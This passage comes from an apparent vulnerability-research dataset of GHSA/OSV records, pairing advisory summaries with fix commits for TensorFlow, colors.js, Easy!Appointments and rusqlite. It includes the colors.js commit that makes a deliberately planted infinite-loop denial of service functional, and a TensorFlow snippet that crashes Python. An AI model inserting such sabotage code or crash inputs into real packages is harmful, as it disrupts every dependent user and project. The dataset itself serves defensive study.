conversion attempt to resource.\n+  if (descr->fields == nullptr) {\n+    return errors::Internal(\"Unexpected numpy data type\");\n+  }\n+\n   if (PyDict_Next(descr->fields, &pos, &key, &value)) {\n     \/\/ In Python 3, the keys of numpy custom struct types are unicode, unlike\n     \/\/ Python 2, where the keys are bytes.",
            "code_diff":"@@ -16,6 +16,7 @@ limitations under the License.\n #include \"tensorflow\/python\/lib\/core\/ndarray_tensor.h\"\n \n #include <cstring>\n+#include <optional>\n \n #include \"tensorflow\/c\/eager\/tfe_context_internal.h\"\n #include \"tensorflow\/c\/tf_tensor_internal.h\"\n@@ -74,6 +75,13 @@ Status PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\n   PyObject* key;\n   PyObject* value;\n   Py_ssize_t pos = 0;\n+\n+  \/\/ Return an error if the fields attribute is null.\n+  \/\/ Occurs with an improper conversion attempt to resource.\n+  if (descr->fields == nullptr) {\n+    return errors::Internal(\"Unexpected numpy data type\");\n+  }\n+\n   if (PyDict_Next(descr->fields, &pos, &key, &value)) {\n     \/\/ In Python 3, the keys of numpy custom struct types are unicode, unlike\n     \/\/ Python 2, where the keys are bytes."
        },
        {
            "index":318,
            "vuln_id":"GHSA-5rqg-jm4f-cqx7",
            "cwe_id":"{'CWE-835'}",
            "score":0.0,
            "chain":"{'https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75', 'https:\/\/github.com\/Marak\/colors.js\/commit\/137c6dae3339e97f4bbc838c221803c363b0a9fd', 'https:\/\/github.com\/Marak\/colors.js\/commit\/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26'}",
            "dataset":"osv",
            "summary":"Infinite loop causing Denial of Service in colors colors is a library for including colored text in node.js consoles. Between 07 and 09 January 2022, colors versions 1.4.1, 1.4.2, and 1.4.44-liberty-2 were published including malicious code that caused a Denial of Service due to an infinite loop. Software dependent on these versions experienced the printing of randomized characters to console and an infinite loop resulting in unbound system resource consumption.\n\nUsers of colors relying on these specific versions should downgrade to version 1.4.0.",
            "published_date":"2022-01-10",
            "chain_len":3,
            "project":"https:\/\/github.com\/Marak\/colors.js",
            "commit_href":"https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75",
            "commit_sha":"5d2d242f656103ac38086d6b26433a09f1c38c75",
            "patch":"MULTI",
            "chain_ord":"['137c6dae3339e97f4bbc838c221803c363b0a9fd', '5d2d242f656103ac38086d6b26433a09f1c38c75', '6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26']",
            "before_first_fix_commit":"{'5d2d242f656103ac38086d6b26433a09f1c38c75'}",
            "last_fix_commit":"6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26",
            "chain_ord_pos":2.0,
            "commit_datetime":"01\/08\/2022, 04:21:02",
            "message":"Fix bug",
            "author":"Marak",
            "comments":"{'com_1': {'author': 'bacloud22', 'datetime': '01\/08\/2022, 07:00:53', 'body': 'oops, now it works \ud83e\udd23'}, 'com_2': {'author': 'AuroPick', 'datetime': '01\/10\/2022, 01:19:13', 'body': 'delete this shit'}, 'com_3': {'author': 'KeZengOo', 'datetime': '01\/10\/2022, 02:21:07', 'body': 'Amazing\uff01'}, 'com_4': {'author': 'summic', 'datetime': '01\/10\/2022, 02:48:32', 'body': 'Disgusting!'}, 'com_5': {'author': 'zhang354455288', 'datetime': '01\/10\/2022, 06:50:25', 'body': 'niubi laotie'}, 'com_6': {'author': 'yyg1219', 'datetime': '01\/10\/2022, 07:10:16', 'body': 'niua niua'}, 'com_7': {'author': 'zhangwenwen12138', 'datetime': '01\/10\/2022, 08:10:05', 'body': '\u94c1\u5b50\uff0c\u4f60\u600e\u4e48\u4e86'}, 'com_8': {'author': 'vaecebyZ', 'datetime': '01\/10\/2022, 09:31:36', 'body': \"While we sympathize with you, you're doing a disservice to other developers.\ud83d\ude28\"}, 'com_9': {'author': 'chen-fac', 'datetime': '01\/10\/2022, 09:37:07', 'body': '\u524d\u6392\u51fa\u552e\u82b1\u751f\u74dc\u5b50'}, 'com_10': {'author': 'DragonCat1', 'datetime': '01\/10\/2022, 09:52:22', 'body': '\u5e7f\u544a\u4f4d\u62db\u79df'}, 'com_11': {'author': 'evanchen0629', 'datetime': '01\/10\/2022, 09:53:53', 'body': '\u524d\u9762\u7684\u540c\u5fd7\u628a\u811a\u6536\u4e00\u6536'}, 'com_12': {'author': 'wokalek', 'datetime': '01\/10\/2022, 09:58:35', 'body': 'Starege'}, 'com_13': {'author': 'brolnickij', 'datetime': '01\/10\/2022, 10:17:54', 'body': 'nice trolling :D'}, 'com_14': {'author': 'withsalt', 'datetime': '01\/10\/2022, 10:26:09', 'body': 'nice code!'}, 'com_15': {'author': 'Ansen', 'datetime': '01\/10\/2022, 10:29:24', 'body': 'six six six'}, 'com_16': {'author': 'SheltonZhu', 'datetime': '01\/10\/2022, 10:39:39', 'body': 'brilliant !!!!!'}, 'com_17': {'author': 'mxj1337', 'datetime': '01\/10\/2022, 11:00:51', 'body': 'LIKE'}, 'com_18': {'author': 'WeirdConstructor', 'datetime': '01\/10\/2022, 12:33:35', 'body': 'Obviously this bugfix is missing a regression test! ;-)'}, 'com_19': {'author': 'wuzhidexiaolang', 'datetime': '01\/10\/2022, 14:28:13', 'body': 'nice'}, 'com_20': {'author': 'manudevcode', 'datetime': '01\/10\/2022, 16:02:59', 'body': \"Lol, when your intentional error, doesn't work xD\"}, 'com_21': {'author': 'LuciusChen', 'datetime': '01\/10\/2022, 16:18:08', 'body': '\u725b\u903c\u554a'}, 'com_22': {'author': 'golangboy', 'datetime': '01\/10\/2022, 17:01:00', 'body': '\u524d\u7aef\u5708\u771f\u70ed\u95f9'}, 'com_23': {'author': 'prietales', 'datetime': '01\/10\/2022, 17:53:17', 'body': 'let am should be const.'}, 'com_24': {'author': 'xinx1n', 'datetime': '01\/11\/2022, 02:20:44', 'body': '\u82df\u5229\u56fd\u5bb6\u751f\u6b7b\u4ee5'}, 'com_25': {'author': 'paoqi1997', 'datetime': '01\/11\/2022, 02:20:59', 'body': '12, 3456'}, 'com_26': {'author': 'manudevcode', 'datetime': '01\/11\/2022, 03:31:54', 'body': '> 12, 3456\\r\\n\\r\\nLa tuya por si las dudas xD'}, 'com_27': {'author': '949nb', 'datetime': '01\/11\/2022, 06:47:08', 'body': 'nice code!'}, 'com_28': {'author': 'npljy', 'datetime': '01\/11\/2022, 08:20:14', 'body': \"If you want to make money from open source, then don't open source\"}, 'com_29': {'author': 'machinebitezz', 'datetime': '01\/11\/2022, 14:24:03', 'body': 'Power to you tbh'}, 'com_30': {'author': 'ethnh', 'datetime': '01\/11\/2022, 16:19:27', 'body': '\ud83d\udd34\ud83d\udfe0\ud83d\udfe1\ud83d\udfe2\ud83d\udd35\ud83d\udfe3\ud83d\udfe4\u26ab\u26aa nice colors'}, 'com_31': {'author': 'zhushiqiang', 'datetime': '01\/12\/2022, 01:47:25', 'body': '666'}, 'com_32': {'author': 'zhushiqiang', 'datetime': '01\/12\/2022, 13:39:52', 'body': '\u8fd9\u662f\u6765\u81eaQQ\u90ae\u7bb1\u7684\u5047\u671f\u81ea\u52a8\u56de\u590d\u90ae\u4ef6\u3002\\n\\xa0\\n\u60a8\u597d\uff0c\u6211\u6700\u8fd1\u6b63\u5728\u4f11\u5047\u4e2d\uff0c\u65e0\u6cd5\u4eb2\u81ea\u56de\u590d\u60a8\u7684\u90ae\u4ef6\u3002\u6211\u5c06\u5728\u5047\u671f\u7ed3\u675f\u540e\uff0c\u5c3d\u5feb\u7ed9\u60a8\u56de\u590d\u3002'}, 'com_33': {'author': 'joaodematejr', 'datetime': '01\/13\/2022, 02:30:37', 'body': '@brunoibias'}, 'com_34': {'author': 'Rusnura', 'datetime': '01\/13\/2022, 03:18:05', 'body': 'Hello World!'}, 'com_35': {'author': 'a6513375', 'datetime': '01\/13\/2022, 13:39:17', 'body': '> \\r\\n\\r\\n\u6211\u8d85'}, 'com_36': {'author': 'zbeanbean', 'datetime': '01\/14\/2022, 06:26:34', 'body': 'wondeful'}, 'com_37': {'author': 'PalmDevs', 'datetime': '01\/19\/2022, 09:58:13', 'body': 'Reject `let`, `const`. Return to `var`. \ud83d\ude0f'}, 'com_38': {'author': 'TechStudent10', 'datetime': '01\/19\/2022, 12:10:56', 'body': 'What bug are you fixing exactly?'}, 'com_39': {'author': 'frankhasen', 'datetime': '01\/19\/2022, 14:07:04', 'body': '> What bug are you fixing exactly?\\r\\n\\r\\nfixing capitalizm bro'}, 'com_40': {'author': 'TechStudent10', 'datetime': '01\/19\/2022, 14:48:09', 'body': '> > What bug are you fixing exactly?\\r\\n> \\r\\n> fixing capitalizm bro\\r\\n\\r\\ntrue i guess.'}, 'com_41': {'author': 'joerez', 'datetime': '01\/20\/2022, 21:33:57', 'body': 'put me in the screencap'}, 'com_42': {'author': 'aaj', 'datetime': '01\/20\/2022, 21:38:03', 'body': 'witnessed'}, 'com_43': {'author': 'yasath', 'datetime': '01\/28\/2022, 14:20:12', 'body': 'so real bestie'}, 'com_44': {'author': 'N1ark', 'datetime': '01\/28\/2022, 14:21:12', 'body': 'we stan'}}",
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'lib\/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Marak\/colors.js\/raw\/5d2d242f656103ac38086d6b26433a09f1c38c75\/lib%2Findex.js', 'patch': \"@@ -15,7 +15,7 @@ require('.\/extendStringPrototype')();\\n \/* remove this line after testing *\/\\n let am = require('..\/lib\/custom\/american');\\n am();\\n-for (let i = 666; i < Infinity; i++;) {\\n+for (let i = 666; i < Infinity; i++) {\\n   if (i % 333) {\\n     \/\/ console.log('testing'.zalgo.rainbow)\\n   }\"}}",
            "message_norm":"fix bug",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('bug', 'FLAW', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/index.js'])",
            "num_files":1.0,
            "patch_content":"From 5d2d242f656103ac38086d6b26433a09f1c38c75 Mon Sep 17 00:00:00 2001\nFrom: Marak <marak.squires@gmail.com>\nDate: Fri, 7 Jan 2022 23:21:02 -0500\nSubject: [PATCH] Fix bug\n\n---\n lib\/index.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/lib\/index.js b\/lib\/index.js\nindex 5cdde14..2808f7f 100644\n--- a\/lib\/index.js\n+++ b\/lib\/index.js\n@@ -15,7 +15,7 @@ require('.\/extendStringPrototype')();\n \/* remove this line after testing *\/\n let am = require('..\/lib\/custom\/american');\n am();\n-for (let i = 666; i < Infinity; i++;) {\n+for (let i = 666; i < Infinity; i++) {\n   if (i % 333) {\n     \/\/ console.log('testing'.zalgo.rainbow)\n   }",
            "code_diff":"@@ -15,7 +15,7 @@ require('.\/extendStringPrototype')();\n \/* remove this line after testing *\/\n let am = require('..\/lib\/custom\/american');\n am();\n-for (let i = 666; i < Infinity; i++;) {\n+for (let i = 666; i < Infinity; i++) {\n   if (i % 333) {\n     \/\/ console.log('testing'.zalgo.rainbow)\n   }"
        },
        {
            "index":307,
            "vuln_id":"GHSA-7f62-4887-cfv5",
            "cwe_id":"{'CWE-269'}",
            "score":8.8,
            "chain":"{'https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/63dbb51decfcc1631c398ecd6d30e3a337845526'}",
            "dataset":"osv",
            "summary":"Privilege escalation in easyappointments The Easy!Appointments API authorization is checked against the user's existence, without validating the permissions. As a result, a low privileged user (eg. provider) can create a new admin user via the \"\/api\/v1\/admins\/\" endpoint and take over the system. A [patch](https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/63dbb51decfcc1631c398ecd6d30e3a337845526) is available on the `develop` branch of the repository.",
            "published_date":"2022-05-11",
            "chain_len":1,
            "project":"https:\/\/github.com\/alextselegidis\/easyappointments",
            "commit_href":"https:\/\/github.com\/alextselegidis\/easyappointments\/commit\/63dbb51decfcc1631c398ecd6d30e3a337845526",
            "commit_sha":"63dbb51decfcc1631c398ecd6d30e3a337845526",
            "patch":"SINGLE",
            "chain_ord":"['63dbb51decfcc1631c398ecd6d30e3a337845526']",
            "before_first_fix_commit":"{'f0e976c9ac9be2a7e7626d2112c71042ba087dfa'}",
            "last_fix_commit":"63dbb51decfcc1631c398ecd6d30e3a337845526",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/09\/2022, 21:26:28",
            "message":"Check the role slug in Api.php",
            "author":"Alex Tselegidis",
            "comments":null,
            "stats":"{'additions': 3, 'deletions': 1, 'total': 4}",
            "files":"{'application\/libraries\/Api.php': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/alextselegidis\/easyappointments\/raw\/63dbb51decfcc1631c398ecd6d30e3a337845526\/application%2Flibraries%2FApi.php', 'patch': \"@@ -77,7 +77,9 @@ public function auth()\\n \\n             $password = $_SERVER['PHP_AUTH_PW'];\\n \\n-            if ( ! $this->CI->accounts->check_login($username, $password))\\n+            $userdata = $this->CI->accounts->check_login($username, $password);\\n+\\n+            if (empty($userdata['role_slug']) || $userdata['role_slug'] !== DB_SLUG_ADMIN)\\n             {\\n                 throw new RuntimeException('The provided credentials do not match any admin user!', 401, 'Unauthorized');\\n             }\"}}",
            "message_norm":"check the role slug in api.php",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['application\/libraries\/Api.php'])",
            "num_files":1.0,
            "patch_content":"From 63dbb51decfcc1631c398ecd6d30e3a337845526 Mon Sep 17 00:00:00 2001\nFrom: Alex Tselegidis <alextselegidis@gmail.com>\nDate: Mon, 9 May 2022 23:26:28 +0200\nSubject: [PATCH] Check the role slug in Api.php\n\n---\n application\/libraries\/Api.php | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a\/application\/libraries\/Api.php b\/application\/libraries\/Api.php\nindex bc60d542e7..863e881d92 100644\n--- a\/application\/libraries\/Api.php\n+++ b\/application\/libraries\/Api.php\n@@ -77,7 +77,9 @@ public function auth()\n \n             $password = $_SERVER['PHP_AUTH_PW'];\n \n-            if ( ! $this->CI->accounts->check_login($username, $password))\n+            $userdata = $this->CI->accounts->check_login($username, $password);\n+\n+            if (empty($userdata['role_slug']) || $userdata['role_slug'] !== DB_SLUG_ADMIN)\n             {\n                 throw new RuntimeException('The provided credentials do not match any admin user!', 401, 'Unauthorized');\n             }",
            "code_diff":"@@ -77,7 +77,9 @@ public function auth()\n \n             $password = $_SERVER['PHP_AUTH_PW'];\n \n-            if ( ! $this->CI->accounts->check_login($username, $password))\n+            $userdata = $this->CI->accounts->check_login($username, $password);\n+\n+            if (empty($userdata['role_slug']) || $userdata['role_slug'] !== DB_SLUG_ADMIN)\n             {\n                 throw new RuntimeException('The provided credentials do not match any admin user!', 401, 'Unauthorized');\n             }"
        },
        {
            "index":893,
            "vuln_id":"GHSA-g4w7-3qr8-5623",
            "cwe_id":"{'CWE-351'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/rusqlite\/rusqlite\/commit\/71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0'}",
            "dataset":"osv",
            "summary":"Improper type usage in rusqlite An issue was discovered in the rusqlite crate before 0.23.0 for Rust. Memory safety can be violated via the repr(Rust) type.",
            "published_date":"2021-08-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/rusqlite\/rusqlite",
            "commit_href":"https:\/\/github.com\/rusqlite\/rusqlite\/commit\/71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0",
            "commit_sha":"71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0",
            "patch":"SINGLE",
            "chain_ord":"['71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0']",
            "before_first_fix_commit":"{'38aea89809ea4154975d853bffe3cb7715fe84d6'}",
            "last_fix_commit":"71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/12\/2020, 18:17:56",
            "message":"Ensure type use for auxdata is repr(C)",
            "author":"Thom Chiovoloni",
            "comments":null,
            "stats":"{'additions': 16, 'deletions': 6, 'total': 22}",
            "files":"{'src\/functions.rs': {'additions': 16, 'deletions': 6, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rusqlite\/rusqlite\/raw\/71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0\/src%2Ffunctions.rs', 'patch': '@@ -67,6 +67,7 @@\\n \/\/!     Ok(())\\n \/\/! }\\n \/\/! ```\\n+use std::any::TypeId;\\n use std::os::raw::{c_int, c_void};\\n use std::panic::{catch_unwind, RefUnwindSafe, UnwindSafe};\\n use std::ptr;\\n@@ -177,13 +178,16 @@ impl Context<\\'_> {\\n     \/\/\/ https:\/\/www.sqlite.org\/c3ref\/get_auxdata.html for a discussion of\\n     \/\/\/ this feature, or the unit tests of this module for an example.\\n     pub fn set_aux<T: \\'static>(&self, arg: c_int, value: T) {\\n-        let boxed = Box::into_raw(Box::new((std::any::TypeId::of::<T>(), value)));\\n+        let boxed = Box::into_raw(Box::new(AuxData {\\n+            id: TypeId::of::<T>(),\\n+            value,\\n+        }));\\n         unsafe {\\n             ffi::sqlite3_set_auxdata(\\n                 self.ctx,\\n                 arg,\\n                 boxed as *mut c_void,\\n-                Some(free_boxed_value::<(std::any::TypeId, T)>),\\n+                Some(free_boxed_value::<AuxData<T>>),\\n             )\\n         };\\n     }\\n@@ -192,20 +196,26 @@ impl Context<\\'_> {\\n     \/\/\/ via `set_aux`. Returns `Ok(None)` if no data has been associated,\\n     \/\/\/ and .\\n     pub fn get_aux<T: \\'static>(&self, arg: c_int) -> Result<Option<&T>> {\\n-        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *mut (std::any::TypeId, T) };\\n+        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *const AuxData<T> };\\n         if p.is_null() {\\n             Ok(None)\\n         } else {\\n-            let id_val = unsafe { &*p };\\n-            if std::any::TypeId::of::<T>() != id_val.0 {\\n+            let id = unsafe { (*p).id };\\n+            if TypeId::of::<T>() != id {\\n                 Err(Error::GetAuxWrongType)\\n             } else {\\n-                Ok(Some(&id_val.1))\\n+                Ok(Some(unsafe { &(*p).value }))\\n             }\\n         }\\n     }\\n }\\n \\n+#[repr(C)]\\n+struct AuxData<T: \\'static> {\\n+    id: TypeId,\\n+    value: T,\\n+}\\n+\\n \/\/\/ `feature = \"functions\"` Aggregate is the callback interface for user-defined\\n \/\/\/ aggregate function.\\n \/\/\/'}}",
            "message_norm":"ensure type use for auxdata is repr(c)",
            "language":"fr",
            "entities":"[('ensure', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/functions.rs'])",
            "num_files":1.0,
            "patch_content":"From 71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0 Mon Sep 17 00:00:00 2001\nFrom: Thom Chiovoloni <tchiovoloni@mozilla.com>\nDate: Sun, 12 Apr 2020 11:17:56 -0700\nSubject: [PATCH] Ensure type use for auxdata is repr(C)\n\n---\n src\/functions.rs | 22 ++++++++++++++++------\n 1 file changed, 16 insertions(+), 6 deletions(-)\n\ndiff --git a\/src\/functions.rs b\/src\/functions.rs\nindex dbf9b6a31..df40b1822 100644\n--- a\/src\/functions.rs\n+++ b\/src\/functions.rs\n@@ -67,6 +67,7 @@\n \/\/!     Ok(())\n \/\/! }\n \/\/! ```\n+use std::any::TypeId;\n use std::os::raw::{c_int, c_void};\n use std::panic::{catch_unwind, RefUnwindSafe, UnwindSafe};\n use std::ptr;\n@@ -177,13 +178,16 @@ impl Context<'_> {\n     \/\/\/ https:\/\/www.sqlite.org\/c3ref\/get_auxdata.html for a discussion of\n     \/\/\/ this feature, or the unit tests of this module for an example.\n     pub fn set_aux<T: 'static>(&self, arg: c_int, value: T) {\n-        let boxed = Box::into_raw(Box::new((std::any::TypeId::of::<T>(), value)));\n+        let boxed = Box::into_raw(Box::new(AuxData {\n+            id: TypeId::of::<T>(),\n+            value,\n+        }));\n         unsafe {\n             ffi::sqlite3_set_auxdata(\n                 self.ctx,\n                 arg,\n                 boxed as *mut c_void,\n-                Some(free_boxed_value::<(std::any::TypeId, T)>),\n+                Some(free_boxed_value::<AuxData<T>>),\n             )\n         };\n     }\n@@ -192,20 +196,26 @@ impl Context<'_> {\n     \/\/\/ via `set_aux`. Returns `Ok(None)` if no data has been associated,\n     \/\/\/ and .\n     pub fn get_aux<T: 'static>(&self, arg: c_int) -> Result<Option<&T>> {\n-        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *mut (std::any::TypeId, T) };\n+        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *const AuxData<T> };\n         if p.is_null() {\n             Ok(None)\n         } else {\n-            let id_val = unsafe { &*p };\n-            if std::any::TypeId::of::<T>() != id_val.0 {\n+            let id = unsafe { (*p).id };\n+            if TypeId::of::<T>() != id {\n                 Err(Error::GetAuxWrongType)\n             } else {\n-                Ok(Some(&id_val.1))\n+                Ok(Some(unsafe { &(*p).value }))\n             }\n         }\n     }\n }\n \n+#[repr(C)]\n+struct AuxData<T: 'static> {\n+    id: TypeId,\n+    value: T,\n+}\n+\n \/\/\/ `feature = \"functions\"` Aggregate is the callback interface for user-defined\n \/\/\/ aggregate function.\n \/\/\/",
            "code_diff":"@@ -67,6 +67,7 @@\n \/\/!     Ok(())\n \/\/! }\n \/\/! ```\n+use std::any::TypeId;\n use std::os::raw::{c_int, c_void};\n use std::panic::{catch_unwind, RefUnwindSafe, UnwindSafe};\n use std::ptr;\n@@ -177,13 +178,16 @@ impl Context<'_> {\n     \/\/\/ https:\/\/www.sqlite.org\/c3ref\/get_auxdata.html for a discussion of\n     \/\/\/ this feature, or the unit tests of this module for an example.\n     pub fn set_aux<T: 'static>(&self, arg: c_int, value: T) {\n-        let boxed = Box::into_raw(Box::new((std::any::TypeId::of::<T>(), value)));\n+        let boxed = Box::into_raw(Box::new(AuxData {\n+            id: TypeId::of::<T>(),\n+            value,\n+        }));\n         unsafe {\n             ffi::sqlite3_set_auxdata(\n                 self.ctx,\n                 arg,\n                 boxed as *mut c_void,\n-                Some(free_boxed_value::<(std::any::TypeId, T)>),\n+                Some(free_boxed_value::<AuxData<T>>),\n             )\n         };\n     }\n@@ -192,20 +196,26 @@ impl Context<'_> {\n     \/\/\/ via `set_aux`. Returns `Ok(None)` if no data has been associated,\n     \/\/\/ and .\n     pub fn get_aux<T: 'static>(&self, arg: c_int) -> Result<Option<&T>> {\n-        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *mut (std::any::TypeId, T) };\n+        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *const AuxData<T> };\n         if p.is_null() {\n             Ok(None)\n         } else {\n-            let id_val = unsafe { &*p };\n-            if std::any::TypeId::of::<T>() != id_val.0 {\n+            let id = unsafe { (*p).id };\n+            if TypeId::of::<T>() != id {\n                 Err(Error::GetAuxWrongType)\n             } else {\n-                Ok(Some(&id_val.1))\n+                Ok(Some(unsafe { &(*p).value }))\n             }\n         }\n     }\n }\n \n+#[repr(C)]\n+struct AuxData<T: 'static> {\n+    id: TypeId,\n+    value: T,\n+}\n+\n \/\/\/ `feature = \"functions\"` Aggregate is the callback interface for user-defined\n \/\/\/ aggregate function.\n \/\/\/"
        },
        {
            "index":623,
            "vuln_id":"GHSA-hhvc-g5hv-48c6",
            "cwe_id":"{'CWE-471'}",
            "score":4.4,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7'}",
            "dataset":"osv",
            "summary":"Write to immutable memory region in TensorFlow ### Impact\nThe `tf.raw_ops.ImmutableConst` operation returns a constant tensor created from a memory mapped file which is assumed immutable. However, if the type of the tensor is not an integral type, the operation crashes the Python interpreter as it tries to write to the memory area:\n\n```python\n>>> import tensorflow as tf\n>>> with open('\/tmp\/test.txt','w') as f: f.write('a'*128)\n>>> tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,\n                              memory_region_name='\/tmp\/test.txt')\n```\n\nIf the file is too small, TensorFlow properly returns an error as the memory area has fewer bytes than what is needed for the tensor it creates. However, as soon as there are enough bytes, the above snippet causes a segmentation fault.\n\nThis is because the alocator used to return the buffer data is not marked as returning an opaque handle since the [needed virtual method](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7\/tensorflow\/core\/framework\/typed_allocator.h#L78-L85) is [not overriden](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/acdf3c04fcfa767ae8d109b9e1f727ef050dba4d\/tensorflow\/core\/kernels\/immutable_constant_op.cc).\n\n### Patches\nWe have patched the issue in GitHub commit [c1e1fc899ad5f8c725dcbb6470069890b5060bc7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2020-12-10",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7",
            "commit_sha":"c1e1fc899ad5f8c725dcbb6470069890b5060bc7",
            "patch":"SINGLE",
            "chain_ord":"['c1e1fc899ad5f8c725dcbb6470069890b5060bc7']",
            "before_first_fix_commit":"{'acdf3c04fcfa767ae8d109b9e1f727ef050dba4d'}",
            "last_fix_commit":"c1e1fc899ad5f8c725dcbb6470069890b5060bc7",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/05\/2020, 01:06:23",
            "message":"Mark `MemmappedTensorAllocator` as returning opaque handle.\n\nThis allocator is used for `ImmutableConstantOp` and it returns a handle to the contents of a memory mapped file which is supposed to represent a tensor.\n\nFor tensors of complex types (resources, variables and strings), allocators which are not marked as returning opaque handles will call placement new to initialize each element. This means writing to the buffer. However, in our case, the buffer is immutable and already contains the tensor data. Hence, writing to it is both destructive and causes a crash.\n\nPiperOrigin-RevId: 345786451\nChange-Id: I46369c50fa60b3431709ffe068a728d3061f49c4",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 6, 'deletions': 0, 'total': 6}",
            "files":"{'tensorflow\/core\/kernels\/immutable_constant_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7\/tensorflow%2Fcore%2Fkernels%2Fimmutable_constant_op.cc', 'patch': \"@@ -62,6 +62,12 @@ class MemmappedTensorAllocator : public Allocator {\\n \\n   void set_delete_on_deallocate() { delete_on_deallocate_ = true; }\\n \\n+  \/\/ Make sure tensors or complex types (strings, variants, resources) don't get\\n+  \/\/ their constructor called via a placement new since that would require\\n+  \/\/ writing to immutable data.\\n+  \/\/ See also: tensorflow\/core\/framework\/typed_allocator.h\\n+  bool AllocatesOpaqueHandle() const override { return true; }\\n+\\n  private:\\n   std::unique_ptr<ReadOnlyMemoryRegion> memory_region_;\\n   \/\/ If there is an error during allocation we keep it in this status.\"}}",
            "message_norm":"mark `memmappedtensorallocator` as returning opaque handle.\n\nthis allocator is used for `immutableconstantop` and it returns a handle to the contents of a memory mapped file which is supposed to represent a tensor.\n\nfor tensors of complex types (resources, variables and strings), allocators which are not marked as returning opaque handles will call placement new to initialize each element. this means writing to the buffer. however, in our case, the buffer is immutable and already contains the tensor data. hence, writing to it is both destructive and causes a crash.\n\npiperorigin-revid: 345786451\nchange-id: i46369c50fa60b3431709ffe068a728d3061f49c4",
            "language":"en",
            "entities":"[('initialize', 'SECWORD', ''), ('345786451', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/immutable_constant_op.cc'])",
            "num_files":1.0,
            "patch_content":"From c1e1fc899ad5f8c725dcbb6470069890b5060bc7 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Fri, 4 Dec 2020 17:06:23 -0800\nSubject: [PATCH] Mark `MemmappedTensorAllocator` as returning opaque handle.\n\nThis allocator is used for `ImmutableConstantOp` and it returns a handle to the contents of a memory mapped file which is supposed to represent a tensor.\n\nFor tensors of complex types (resources, variables and strings), allocators which are not marked as returning opaque handles will call placement new to initialize each element. This means writing to the buffer. However, in our case, the buffer is immutable and already contains the tensor data. Hence, writing to it is both destructive and causes a crash.\n\nPiperOrigin-RevId: 345786451\nChange-Id: I46369c50fa60b3431709ffe068a728d3061f49c4\n---\n tensorflow\/core\/kernels\/immutable_constant_op.cc | 6 ++++++\n 1 file changed, 6 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/immutable_constant_op.cc b\/tensorflow\/core\/kernels\/immutable_constant_op.cc\nindex 0dd08c694eb6c5..1cfbdb82778913 100644\n--- a\/tensorflow\/core\/kernels\/immutable_constant_op.cc\n+++ b\/tensorflow\/core\/kernels\/immutable_constant_op.cc\n@@ -62,6 +62,12 @@ class MemmappedTensorAllocator : public Allocator {\n \n   void 